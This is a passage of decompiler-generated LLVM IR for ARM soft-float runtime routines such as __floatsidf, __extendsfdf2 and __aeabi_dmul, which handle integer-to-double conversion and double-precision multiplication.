  ret i32 %v8_1ef5c

dec_label_pc_1ef6c:                               ; preds = %dec_label_pc_1ef48
  %v1_1ef6c = sub i32 0, %v2_1ef40
  %v1_1ef70 = add i32 %v2_1ef40, 32
  %v0_1ef74 = load i32, i32* @r0, align 4
  %v6_1ef74 = lshr i32 %v0_1ef74, %v1_1ef70
  %v1_1ef78 = load i32, i32* %r1.global-to-local, align 4
  %v7_1ef78 = shl i32 %v1_1ef78, %v1_1ef6c
  %v8_1ef78 = or i32 %v7_1ef78, %v6_1ef74
  %v0_1ef7c = load i32, i32* @r5, align 4
  store i32 %v0_1ef7c, i32* %r1.global-to-local, align 4
  %v2_1ef80 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1ef80, i32* %r4.global-to-local, align 4
  ret i32 %v8_1ef78

dec_label_pc_1ef88:                               ; preds = %.thread8
  %v0_1ef88 = load i32, i32* %r1.global-to-local, align 4
  %v6_1ef88 = lshr i32 %v0_1ef88, %v2_1ef40
  %v0_1ef8c = load i32, i32* @r5, align 4
  store i32 %v0_1ef8c, i32* %r1.global-to-local, align 4
  %v2_1ef90 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1ef90, i32* %r4.global-to-local, align 4
  ret i32 %v6_1ef88

; uselistorder directives
  uselistorder i32 %v2_1ef40, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_1ef28, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1ef28, { 2, 0, 1, 3 }
  uselistorder i32 %v6_1ef1c, { 1, 0, 2 }
  uselistorder i32 %v2_1eef0, { 1, 0, 2 }
  uselistorder i32 %v5_1eeec, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_1eed8, { 1, 0 }
  uselistorder i32 %v1_1eed8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1eecc, { 1, 0 }
  uselistorder i32 %v1_1eecc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1eec0, { 1, 0 }
  uselistorder i32 %v0_1ef0c, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 3, 1, 2, 4, 13, 14, 5, 16, 17, 6, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 23, 7, 24, 25, 26, 0 }
  uselistorder i32 -20, { 1, 4, 2, 0, 3 }
  uselistorder i32 -2, { 9, 10, 11, 19, 2, 4, 5, 3, 12, 13, 14, 0, 6, 8, 7, 15, 21, 22, 23, 24, 17, 16, 20, 18, 1 }
  uselistorder i32 -4, { 10, 2, 11, 50, 51, 52, 53, 54, 55, 0, 1, 49, 12, 56, 13, 21, 73, 74, 75, 6, 22, 23, 24, 76, 77, 78, 7, 25, 26, 27, 79, 80, 81, 8, 28, 29, 82, 20, 19, 83, 84, 85, 18, 17, 16, 15, 30, 31, 32, 33, 34, 5, 35, 3, 36, 4, 86, 14, 37, 45, 46, 47, 48, 38, 39, 61, 62, 63, 9, 64, 65, 66, 40, 60, 67, 68, 69, 70, 71, 72, 41, 57, 58, 59, 42, 43, 44 }
  uselistorder i32 15, { 9, 10, 3, 16, 0, 18, 11, 12, 13, 14, 1, 20, 19, 2, 15, 4, 5, 6, 7, 8, 17 }
  uselistorder i32 -8, { 13, 14, 1, 42, 15, 16, 17, 43, 24, 25, 26, 27, 28, 29, 23, 22, 12, 21, 20, 19, 18, 30, 31, 32, 33, 34, 46, 47, 35, 36, 48, 37, 49, 41, 38, 39, 40, 2, 44, 45, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 128, { 14, 15, 8, 9, 6, 7, 10, 21, 20, 0, 1, 2, 11, 22, 23, 3, 4, 12, 24, 5, 17, 13, 25, 16, 18, 19 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 10 }
  uselistorder i32 -16, { 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder i32 65536, { 3, 4, 5, 0, 6, 7, 8, 9, 11, 10, 16, 12, 17, 13, 18, 14, 19, 15, 20, 21, 22, 26, 23, 27, 24, 28, 25, 29, 31, 30, 32, 84, 34, 33, 83, 82, 36, 35, 38, 37, 85, 39, 40, 41, 1, 2, 42, 43, 44, 45, 46, 47, 48, 49, 51, 50, 52, 54, 53, 55, 56, 57, 58, 59, 60, 62, 61, 63, 66, 65, 64, 67, 68, 69, 72, 71, 70, 73, 75, 76, 74, 77, 79, 80, 78, 81 }
  uselistorder i32 32768, { 3, 4, 1, 6, 2, 7, 0, 5 }
  uselistorder i32 65535, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32 52, { 1, 30, 5, 26, 20, 21, 6, 2, 7, 9, 8, 10, 3, 11, 28, 24, 12, 13, 29, 27, 25, 32, 33, 4, 34, 0, 35, 36, 14, 15, 31, 16, 18, 22, 17, 19, 23 }
  uselistorder i32 20, { 7, 68, 69, 4, 12, 9, 8, 16, 74, 2, 77, 17, 70, 71, 47, 48, 49, 50, 72, 73, 18, 67, 19, 84, 15, 85, 86, 5, 87, 75, 20, 1, 0, 10, 21, 22, 23, 24, 25, 78, 79, 26, 27, 76, 28, 29, 64, 65, 66, 51, 30, 31, 52, 53, 3, 32, 33, 88, 34, 35, 36, 37, 38, 89, 39, 40, 41, 42, 14, 43, 6, 11, 80, 81, 82, 83, 44, 54, 55, 56, 57, 58, 59, 60, 61, 13, 45, 62, 46, 63 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1ef18, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1ef98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1ef98:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1ef98 = load i32, i32* @r4, align 4
  %v2_1ef98 = icmp eq i32 %v0_1ef98, 0
  %v1_1ef9c = xor i32 %arg3, 1048576
  store i32 %v1_1ef9c, i32* @r3, align 4
  br i1 %v2_1ef98, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1ef98
  %v1_1efa0 = load i32, i32* @r1, align 4
  %v2_1efa0 = xor i32 %v1_1efa0, 1048576
  store i32 %v2_1efa0, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1ef98
  %v1_1efa8 = load i32, i32* @r5, align 4
  %v2_1efa8 = add i32 %v1_1efa8, -1
  store i32 %v2_1efa8, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1efac = call i32 @function_1edf0()
  store i32 %v0_1efac, i32* %r0.global-to-local, align 4
  %v0_1efb0 = load i32, i32* @r4, align 4
  %v0_1efb0.off = add i32 %v0_1efb0, 4194303
  %tmp = icmp ult i32 %v0_1efb0.off, 2097152
  %v1_1f040 = load i32, i32* @r5, align 4
  %v1_1f040.off = add i32 %v1_1f040, 4194303
  %tmp44 = icmp ult i32 %v1_1f040.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_1efbc

dec_label_pc_1efbc:                               ; preds = %bb30
  %v4_1efbc = icmp eq i32 %v1_1f040, %v0_1efb0
  br i1 %v4_1efbc, label %bb31, label %dec_label_pc_1efc8

bb31:                                             ; preds = %dec_label_pc_1efbc
  %v2_1efc0 = load i32, i32* @r2, align 4
  %v5_1efc0 = icmp eq i32 %v2_1efc0, %v0_1efac
  br i1 %v5_1efc0, label %dec_label_pc_1efdc, label %dec_label_pc_1efc8

dec_label_pc_1efc8:                               ; preds = %dec_label_pc_1efbc, %bb31
  %v2_1efc8 = or i32 %v0_1efb0, %v0_1efac
  %v4_1efc8 = icmp eq i32 %v2_1efc8, 0
  br i1 %v4_1efc8, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1efc8
  %v1_1efd0 = load i32, i32* @r2, align 4
  store i32 %v1_1efd0, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1efc8, %bb32
  %v1_1efd8 = phi i32 [ %v0_1efac, %dec_label_pc_1efc8 ], [ %v1_1efd0, %bb32 ]
  ret i32 %v1_1efd8

dec_label_pc_1efdc:                               ; preds = %bb31
  %v0_1efdc = load i32, i32* @r1, align 4
  %v1_1efdc = load i32, i32* @r3, align 4
  %v4_1efdc = icmp eq i32 %v1_1efdc, %v0_1efdc
  br i1 %v4_1efdc, label %dec_label_pc_1efdc..thread8_crit_edge, label %bb33

dec_label_pc_1efdc..thread8_crit_edge:            ; preds = %dec_label_pc_1efdc
  %v0_1efec.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_1efdc
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1efdc..thread8_crit_edge, %bb33
  %v0_1efec = phi i32 [ %v0_1efec.pre, %dec_label_pc_1efdc..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_1efec = xor i1 %v4_1efdc, true
  call void @__pseudo_cond_branch(i1 %v2_1efec, i32 %v0_1efec)
  %v0_1eff0 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_1eff0, 2097152
  br i1 %tmp45, label %dec_label_pc_1eff8, label %dec_label_pc_1f00c

dec_label_pc_1eff8:                               ; preds = %.thread8
  %v0_1eff8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1eff8 = icmp slt i32 %v0_1eff8, 0
  %v2_1eff8 = mul i32 %v0_1eff8, 2
  store i32 %v2_1eff8, i32* %r0.global-to-local, align 4
  %v0_1effc = load i32, i32* @r1, align 4
  %v3_1effc = mul i32 %v0_1effc, 2
  %v4_1effc = zext i1 %v1_1eff8 to i32
  %v5_1effc = or i32 %v3_1effc, %v4_1effc
  %v9_1effc = icmp ule i32 %v5_1effc, %v0_1effc
  %v10_1effc = icmp ult i32 %v3_1effc, %v0_1effc
  %v11_1effc = select i1 %v1_1eff8, i1 %v9_1effc, i1 %v10_1effc
  br i1 %v11_1effc, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_1eff8
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_1eff8, %bb34
  ret i32 %v2_1eff8

dec_label_pc_1f00c:                               ; preds = %.thread8
  %v2_1f00c = icmp ugt i32 %v0_1eff0, -4194305
  br i1 %v2_1f00c, label %dec_label_pc_1f00c..thread9_crit_edge, label %bb36

dec_label_pc_1f00c..thread9_crit_edge:            ; preds = %dec_label_pc_1f00c
  %v0_1f018.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_1f00c
  %v1_1f010 = load i32, i32* @r1, align 4
  %v2_1f010 = add i32 %v1_1f010, 1048576
  store i32 %v2_1f010, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1f00c..thread9_crit_edge, %bb36
  %v0_1f018 = phi i32 [ %v0_1f018.pre, %dec_label_pc_1f00c..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_1f018 = xor i1 %v2_1f00c, true
  call void @__pseudo_cond_branch(i1 %v2_1f018, i32 %v0_1f018)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_1f04c.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_1f04c.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_1f038 = load i32, i32* @r3, align 4
  %v1_1f03c = load i32, i32* @r2, align 4
  store i32 %v1_1f03c, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1f04c23 = phi i32 [ %v1_1f04c.pre, %.thread14 ], [ %v1_1f038, %bb37 ]
  %v1_1f048 = phi i32 [ %v0_1efac, %.thread14 ], [ %v1_1f03c, %bb37 ]
  store i32 %v1_1f048, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_1f058 = phi i32 [ %v1_1f04c23, %bb38 ], [ %v1_1f04c.pre, %.thread11 ]
  %v1_1f060 = phi i32 [ %v1_1f048, %bb38 ], [ %v0_1efac, %.thread11 ]
  %v4_1f04c = mul i32 %v1_1f058, 4096
  %v5_1f04c = or i32 %v4_1f04c, %v1_1f060
  %v7_1f04c = icmp eq i32 %v5_1f04c, 0
  br i1 %v7_1f04c, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1f050 = load i32, i32* @r2, align 4
  %v2_1f050 = load i32, i32* @r3, align 4
  %v5_1f050 = mul i32 %v2_1f050, 4096
  %v6_1f050 = or i32 %v5_1f050, %v1_1f050
  %v8_1f050 = icmp eq i32 %v6_1f050, 0
  br i1 %v8_1f050, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_1f054 = icmp eq i32 %v2_1f050, %v1_1f058
  br i1 %v5_1f054, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1f060

; uselistorder directives
  uselistorder i32 %v1_1f04c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1effc, { 1, 2, 0 }
  uselistorder i32 %v2_1eff8, { 1, 0 }
  uselistorder i1 %v1_1eff8, { 1, 0 }
  uselistorder i32 %v0_1eff0, { 1, 0 }
  uselistorder i1 %v4_1efdc, { 1, 0 }
  uselistorder i32 %v0_1efb0, { 2, 0, 1 }
  uselistorder i32 %v0_1efac, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1efc8, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1f064 = icmp eq i32 %arg1, 0
  br i1 %v2_1f064, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1f06c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1f064, i32 %v0_1f06c)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_1f084 = call i32 @function_1eea4()
  ret i32 %v0_1f084

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1f088 = icmp eq i32 %arg1, 0
  br i1 %v2_1f088, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1f090 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1f088, i32 %v0_1f090)
  store i32 1074, i32* @r4, align 4
  %v1_1f0a0 = and i32 %arg1, -2147483648
  store i32 %v1_1f0a0, i32* @r5, align 4
  %v2_1f0a0 = icmp eq i32 %v1_1f0a0, 0
  br i1 %v2_1f0a0, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1f0a4 = sub i32 0, %arg1
  store i32 %v2_1f0a4, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_1f0ac = call i32 @function_1eea4()
  ret i32 %v0_1f0ac

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_1f0b0 = mul i32 %arg1, 2
  store i32 %v2_1f0b0, i32* %r2.global-to-local, align 4
  %v4_1f0b0 = icmp eq i32 %v2_1f0b0, 0
  %v1_1f0b4 = and i32 %v2_1f0b0, 4
  %v2_1f0b4 = icmp ne i32 %v1_1f0b4, 0
  %v3_1f0b4 = sdiv i32 %v2_1f0b0, 8
  %v3_1f0b8 = zext i1 %v2_1f0b4 to i32
  %v6_1f0b8 = zext i32 %v3_1f0b4 to i64
  %v7_1f0b8 = sub nsw i32 33, %v3_1f0b4
  %v8_1f0b8 = zext i32 %v7_1f0b8 to i64
  %v9_1f0b8 = shl i64 %v6_1f0b8, %v8_1f0b8
  %v10_1f0b8 = sub nsw i32 32, %v3_1f0b4
  %v11_1f0b8 = shl i32 %v3_1f0b8, %v10_1f0b8
  %v12_1f0b8 = zext i32 %v11_1f0b8 to i64
  %v14_1f0b8 = or i64 %v12_1f0b8, %v9_1f0b8
  %v15_1f0b8 = trunc i64 %v14_1f0b8 to i32
  store i32 %v15_1f0b8, i32* %r1.global-to-local, align 4
  %v3_1f0bc = mul i32 %arg1, 536870912
  store i32 %v3_1f0bc, i32* @r0, align 4
  br i1 %v4_1f0b0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1f0c0 = and i32 %v2_1f0b0, -16777216
  store i32 %v2_1f0c0, i32* @r3, align 4
  %v4_1f0c0 = icmp eq i32 %v2_1f0c0, 0
  br i1 %v4_1f0c0, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_1f0c4 = icmp ugt i32 %v2_1f0b0, -16777217
  br i1 %v4_1f0c4, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1f0c8 = xor i32 %v15_1f0b8, 939524096
  store i32 %v2_1f0c8, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_1f0cc = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_1f0cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1f0cc, i32 %v0_1f0cc)
  %v0_1f0d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1f0d0 = icmp eq i32 %v0_1f0d0, 0
  br i1 %v2_1f0d0, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_1f0d4 = load i32, i32* @r3, align 4
  %v4_1f0d4 = icmp eq i32 %v1_1f0d4, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_1f0d8 = phi i1 [ true, %.thread1 ], [ %v4_1f0d4, %bb9 ]
  %v0_1f0d8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1f0d8, i32 %v0_1f0d8)
  store i32 896, i32* @r4, align 4
  %v0_1f0e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f0e4 = and i32 %v0_1f0e4, -2147483648
  store i32 %v1_1f0e4, i32* @r5, align 4
  %tmp = bitcast i32 %v0_1f0e4 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_1f0e8 = bitcast float %tmp11 to i32
  store i32 %v1_1f0e8, i32* @r1, align 4
  %v0_1f0ec = call i32 @function_1eea4()
  ret i32 %v0_1f0ec

; uselistorder directives
  uselistorder i32 %v3_1f0b4, { 1, 2, 0 }
  uselistorder i32 %v2_1f0b0, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_1eea4, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1f0f0 = or i32 %arg2, %arg1
  %v4_1f0f0 = icmp eq i32 %v2_1f0f0, 0
  %v0_1f0f4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1f0f0, i32 %v0_1f0f4)
  store i32 0, i32* @r5, align 4
  %v0_1f100 = call i32 @function_1f120()
  ret i32 %v0_1f100
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1f104 = or i32 %arg2, %arg1
  %v4_1f104 = icmp eq i32 %v2_1f104, 0
  %v0_1f108 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1f104, i32 %v0_1f108)
  %v1_1f114 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1f114, i32 ptrtoint (i32* @global_var_1f120.1283 to i32))
  %v1_1f118 = sub i32 0, %arg1
  ret i32 %v1_1f118

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1f120() local_unnamed_addr {
dec_label_pc_1f120:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1f128 = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_1f128, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1ee44.1281 to i32))
  %tmp6 = icmp ult i32 %v0_1f128, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1f120
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1f120, %bb
  %v1_1f140 = phi i32 [ 3, %dec_label_pc_1f120 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1f128, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1f140 = add nuw nsw i32 %v1_1f140, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1f144 = phi i32 [ %v1_1f140, %bb3 ], [ %v2_1f140, %bb4 ]
  %not. = icmp slt i32 %v0_1f128, 0
  %v4_1f144 = zext i1 %not. to i32
  %v5_1f144 = add nsw i32 %v0_1f144, %v4_1f144
  %v1_1f148 = sub nsw i32 32, %v5_1f144
  %v0_1f14c = load i32, i32* @r0, align 4
  %v6_1f14c = shl i32 %v0_1f14c, %v1_1f148
  store i32 %v6_1f14c, i32* @ip, align 4
  %v6_1f150 = lshr i32 %v0_1f14c, %v5_1f144
  %v1_1f154 = load i32, i32* @r1, align 4
  %v7_1f154 = shl i32 %v1_1f154, %v1_1f148
  %v8_1f154 = or i32 %v7_1f154, %v6_1f150
  %v6_1f158 = lshr i32 %v1_1f154, %v5_1f144
  %v0_1f15c = load i32, i32* %r4.global-to-local, align 4
  %v2_1f15c = add i32 %v0_1f15c, %v5_1f144
  store i32 %v2_1f15c, i32* @r4, align 4
  %v4_1f160 = sext i32 %v8_1f154 to i64
  %v5_1f160 = call i32 @function_1ee44(i64 %v4_1f160, i32 %v6_1f158, i32 %v5_1f144, i32 %v1_1f148)
  ret i32 %v5_1f160

; uselistorder directives
  uselistorder i32 %v5_1f144, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 4, 25, 26, 3, 20, 21, 27, 28, 29, 30, 5, 6, 32, 2, 0, 7, 31, 1, 8, 9, 10, 11, 12, 13, 22, 14, 15, 17, 18, 19, 16, 23, 24 }
  uselistorder i32 3, { 57, 13, 43, 68, 44, 69, 70, 71, 17, 73, 9, 74, 18, 75, 76, 0, 14, 77, 10, 1, 2, 59, 79, 3, 4, 45, 46, 88, 47, 48, 49, 50, 51, 52, 80, 7, 22, 81, 72, 23, 24, 62, 25, 63, 26, 64, 27, 65, 28, 66, 56, 8, 58, 53, 89, 15, 84, 20, 85, 19, 86, 21, 83, 54, 11, 78, 12, 82, 5, 87, 55, 29, 30, 31, 60, 32, 33, 61, 34, 6, 36, 35, 42, 37, 67, 38, 39, 40, 41, 16 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1f164 = load i32, i32* @r4, align 4
  store i32 %v3_1f164, i32* %stack_var_-16, align 4
  %v12_1f164 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1f170 = udiv i32 %arg2, 1048576
  %v5_1f170 = urem i32 %v4_1f170, 2048
  store i32 %v5_1f170, i32* %r4.global-to-local, align 4
  %v6_1f170 = icmp eq i32 %v5_1f170, 0
  br i1 %v6_1f170, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_1f174 = udiv i32 %arg4, 1048576
  %v6_1f174 = urem i32 %v5_1f174, 2048
  store i32 %v6_1f174, i32* @r5, align 4
  %v7_1f174 = icmp eq i32 %v6_1f174, 0
  br i1 %v7_1f174, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_1f178 = icmp eq i32 %v5_1f170, 2047
  br i1 %v5_1f178, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_1f17c = icmp eq i32 %v6_1f174, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_1f180 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_1f17c, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_1f184.1286 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1f180, i32 ptrtoint (i32* @global_var_1f35c.1284 to i32))
  %v0_1f184 = load i32, i32* %r4.global-to-local, align 4
  %v1_1f184 = load i32, i32* @r5, align 4
  %v2_1f184 = add i32 %v1_1f184, %v0_1f184
  store i32 %v2_1f184, i32* %r4.global-to-local, align 4
  %v2_1f188 = xor i32 %arg4, %arg2
  %v1_1f18c = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_1f18c, -2097152
  %v5_1f18c = add i32 %tmp51, -1
  %v6_1f18c = and i32 %v5_1f18c, %arg2
  store i32 %v6_1f18c, i32* %r1.global-to-local, align 4
  %v6_1f190 = and i32 %v5_1f18c, %arg4
  %v5_1f194 = mul i32 %arg2, 4096
  %v6_1f194 = or i32 %v5_1f194, %tmp32
  %v8_1f194 = icmp eq i32 %v6_1f194, 0
  br i1 %v8_1f194, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_1f19c5 = or i32 %v6_1f18c, 1048576
  store i32 %v1_1f19c5, i32* %r1.global-to-local, align 4
  %v1_1f1a07 = or i32 %v6_1f190, 1048576
  br label %dec_label_pc_1f220

bb40:                                             ; preds = %.thread2
  %v6_1f198 = mul i32 %arg4, 4096
  %v7_1f198 = or i32 %v6_1f198, %arg3
  %v9_1f198 = icmp eq i32 %v7_1f198, 0
  %v1_1f19c = or i32 %v6_1f18c, 1048576
  store i32 %v1_1f19c, i32* %r1.global-to-local, align 4
  %v1_1f1a0 = or i32 %v6_1f190, 1048576
  br i1 %v9_1f198, label %dec_label_pc_1f220, label %dec_label_pc_1f1a8

dec_label_pc_1f1a8:                               ; preds = %bb40
  %v6_1f1a8 = mul nuw i64 %tmp, %arg1
  %v7_1f1a8 = udiv i64 %v6_1f1a8, 4294967296
  %v9_1f1a8 = trunc i64 %v6_1f1a8 to i32
  store i32 %v9_1f1a8, i32* %ip.global-to-local, align 4
  %v7_1f1b0 = zext i32 %v1_1f19c to i64
  %v11_1f1b0 = mul nuw nsw i64 %v7_1f1b0, %tmp
  %v12_1f1b0 = add i64 %v11_1f1b0, %v7_1f1a8
  %v1_1f1b4 = and i32 %v2_1f188, -2147483648
  %v10_1f1b8 = zext i32 %v1_1f1a0 to i64
  %v11_1f1b8 = mul nuw i64 %v10_1f1b8, %arg1
  %v12_1f1b8 = add i64 %v12_1f1b0, %v11_1f1b8
  %v13_1f1b8 = udiv i64 %v12_1f1b8, 4294967296
  %v15_1f1b8 = trunc i64 %v12_1f1b8 to i32
  %v10_1f1c0 = mul nuw i64 %v10_1f1b8, %v7_1f1b0
  %v11_1f1c0 = add i64 %v13_1f1b8, %v10_1f1c0
  %v12_1f1c0 = udiv i64 %v11_1f1c0, 4294967296
  %v13_1f1c0 = trunc i64 %v12_1f1c0 to i32
  %v14_1f1c0 = trunc i64 %v11_1f1c0 to i32
  %v2_1f1c4 = icmp eq i32 %v9_1f1a8, 0
  br i1 %v2_1f1c4, label %bb42, label %bb41

